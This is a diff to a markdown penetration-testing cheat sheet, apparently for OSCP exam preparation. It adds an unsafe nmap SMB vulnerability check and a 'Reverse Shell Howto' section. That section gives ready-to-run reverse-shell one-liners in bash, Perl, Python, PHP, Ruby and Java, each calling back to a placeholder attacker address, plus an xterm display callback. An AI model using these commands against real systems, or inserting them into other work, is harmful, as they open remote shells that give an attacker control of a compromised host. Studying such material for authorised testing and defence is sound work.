@@ -18,6 +18,9 @@ Collection of commands, tips and tricks and references I found useful during pre
 ### Guess OS using xprobe2
 `xprobe2 <target IP>`
 
+### Check Netbios vulns
+`nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target`
+
 ### Search for SMB vulns
 `nmap -p139,445 <target IP> --script smb-vuln*`
   
@@ -121,6 +124,46 @@ To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<so
 <cfdump var="#env#">
 ```
 
+## Reverse Shell Howto
+
+* Bash
+`bash -i >& /dev/tcp/yourIP/4444 0>&1`
+
+* Perl Linux
+`perl -e 'use Socket;$i="yourIP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+
+* Perl Windows
+`perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"yourIP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`
+
+
+* Python
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("yourIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+
+* PHP
+`php -r '$sock=fsockopen("yourIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+
+* Ruby
+`ruby -rsocket -e'f=TCPSocket.open("yourIP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
+
+* Java (Linux)
+```
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/yourIP/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+* xterm
+
+`xterm -display yourIP:1`
+
+And on your side authorize the connection with `xhost +targetIp` and catch it with `Xnest :1`
+
+
+
+
+## Interactive Shell Howto
+
+
 * Enterprise can run .jsp files too!
 ## References
 * [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md) - MUST read!
@@ -136,3 +179,4 @@ To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<so
 * [Changeme](https://github.com/ztgrace/changeme) - default password scanner
 * [CIRT Default Passwords DB](https://cirt.net/passwords)
 * [From LFI to Shell](http://resources.infosecinstitute.com/local-file-inclusion-code-execution)
+* [Useful Linux commands](https://highon.coffee/blog/linux-commands-cheat-sheet/)
